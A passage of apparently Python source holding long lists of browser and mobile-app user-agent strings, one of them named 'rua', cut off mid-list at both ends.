"Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
"DoCoMo/2.0 P903i(c100;TB;W24H12)",
"DoCoMo/2.0 P903i",
"DoCoMo/2.0 SH10C(c500;TB;W16H12)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
"com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
"Mogujie4Android/NAMhuawei/1290",
"Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
"Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
"nokia-7.1-safari",
"NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
"Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
"Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
"Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
"Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
"Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
"Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
"Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
"Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
"Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
"Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
"Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"]


rua =[
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
